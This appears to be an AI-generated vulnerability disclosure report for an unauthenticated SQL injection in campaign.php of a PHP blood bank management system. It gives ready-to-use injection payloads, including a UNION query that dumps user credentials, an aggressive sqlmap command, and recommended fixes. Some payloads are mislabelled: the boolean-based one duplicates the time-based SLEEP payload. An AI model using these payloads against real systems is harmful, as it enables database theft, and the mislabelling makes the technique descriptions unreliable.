Apologies for the interruption in the previous report. I'll continue and complete the **sixth** vulnerability report in the **"Structured Checklist"** style below:

---

# 🛡️ Security Vulnerability Checklist

## 📄 Report Overview

- **Product Name:** Blood Bank Management System In PHP With Source Code
- **Version:** V1.0
- **Vulnerable File:** `/campaign.php`
- **Vulnerability Type:** SQL Injection
- **Submitter:** 1905589289
- **Vendor Homepage:** [Blood Bank Management System](https://codezips.com/php/blood-bank-management-system-in-php-with-source-code//)
- **Download Link:** [Download Source Code](https://codeload.github.com/codezips/blood-donor-management-system/zip/master)

---

## ✅ Affected Components

- [x] **Application Module:** Campaign Management
- [x] **Parameter Vulnerable:** `cname`
- [x] **Access Level Required:** None (No authentication or authorization needed)

---

## 🕵️‍♂️ Vulnerability Details

### 🔍 Root Cause

- **Description:**  
  The `/campaign.php` script directly incorporates user input from the `cname` parameter into SQL queries without proper sanitization or validation. This oversight allows attackers to inject malicious SQL code, enabling unauthorized database manipulations.

### 💥 Impact

- [x] **Unauthorized Database Access:** Potential to read sensitive data.
- [x] **Data Leakage:** Exposure of confidential information.
- [x] **Data Tampering:** Ability to modify or delete records.
- [x] **System Control:** Possibility of full system compromise.
- [x] **Service Interruption:** Disruption of normal operations.

---

## 🧰 Proof of Concept (PoC)

### 📝 Sample Payloads

#### 1. **Boolean-Based Blind SQL Injection**
```bash
cname=1111' AND (SELECT 4818 FROM (SELECT(SLEEP(5)))TWoD) AND 'VRXZ'='VRXZ&oname=11111&date=2024-12-12&time=11:11&location=1111111
```

#### 2. **Error-Based SQL Injection**
```bash
cname=example' OR 1=1-- &oname=11111&date=2024-12-12&time=11:11&location=1111111
```

#### 3. **Time-Based Blind SQL Injection**
```bash
cname=1111' AND (SELECT 4818 FROM (SELECT(SLEEP(5)))TWoD) AND 'VRXZ'='VRXZ&oname=11111&date=2024-12-12&time=11:11&location=1111111
```

#### 4. **UNION Query SQL Injection**
```bash
cname=1111' UNION ALL SELECT NULL, CONCAT(username, ':', password), NULL, NULL FROM users-- &oname=11111&date=2024-12-12&time=11:11&location=1111111
```

### 🔧 Exploitation Steps Using sqlmap

1. **Identify the Vulnerable Parameter:**
   - The `cname` parameter in the `/campaign.php` file is susceptible to SQL Injection.

2. **Execute the Attack with sqlmap:**

    ```bash
    sqlmap -u "localhost:8080/campaign.php" --data="cname=1111&oname=11111&date=2024-12-12&time=11:11&location=1111111" --batch --level=5 --risk=3 --random-agent --tamper=space2comment --dbms=mysql
    ```

3. **Observation:**
   - The injected payload causes a delay (`SLEEP(5)`), indicating successful exploitation.

### 📸 Execution Evidence

<img width="1372" alt="image" src="https://github.com/user-attachments/assets/a72716d4-5a60-4f9e-a518-0e297a2175c2" />


---

## ⚠️ Risk Assessment

| **Risk Category**  | **Description**                                                                              |
|--------------------|----------------------------------------------------------------------------------------------|
| **Confidentiality**| Attackers could extract sensitive data from the database.                                    |
| **Integrity**      | Possibility of data tampering, unauthorized modifications, or deletions.                     |
| **Availability**   | Malicious queries or data corruption could lead to service interruptions or downtime.        |
| **Overall Severity** | **High** – Requires immediate attention due to ease of exploitation (no login needed).      |

---

## 🛠️ Recommended Fixes

1. **Implement Prepared Statements & Parameter Binding**
   - **Action:** Utilize parameterized queries to ensure user inputs are always treated as data, not executable code.
   - **Benefit:** Prevents attackers from injecting malicious SQL code by separating SQL logic from user inputs.

2. **Enforce Input Validation & Sanitization**
   - **Action:** Strictly validate and sanitize all user inputs, ensuring the `cname` field adheres to expected formats (e.g., no special characters).
   - **Benefit:** Reduces the risk of malicious data being processed by the application.

3. **Apply Principle of Least Privilege**
   - **Action:** Restrict database user permissions to the minimum necessary for application functionality. Avoid using high-privilege accounts like `root` or `admin`.
   - **Benefit:** Minimizes potential damage if an attacker gains database access.

4. **Conduct Regular Security Audits**
   - **Action:** Perform periodic code reviews and security assessments to identify and remediate vulnerabilities promptly.
   - **Benefit:** Ensures ongoing application security and compliance with best practices.

---

## 📌 Additional Information

- **Vendor Homepage:** [Blood Bank Management System In PHP](https://codezips.com/php/blood-bank-management-system-in-php-with-source-code//)
- **Download Source Code:** [Blood Donor Management System](https://codeload.github.com/codezips/blood-donor-management-system/zip/master)
- **SQL Injection Overview:** [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

---

## 📝 Disclaimer

This checklist is intended solely for responsible disclosure to the affected vendor or authorized parties. Unauthorized use or distribution of this information is prohibited and may lead to legal consequences. The vendor is urged to address the identified vulnerability immediately to protect user data and ensure system integrity.

---

**End of Security Vulnerability Checklist**

---
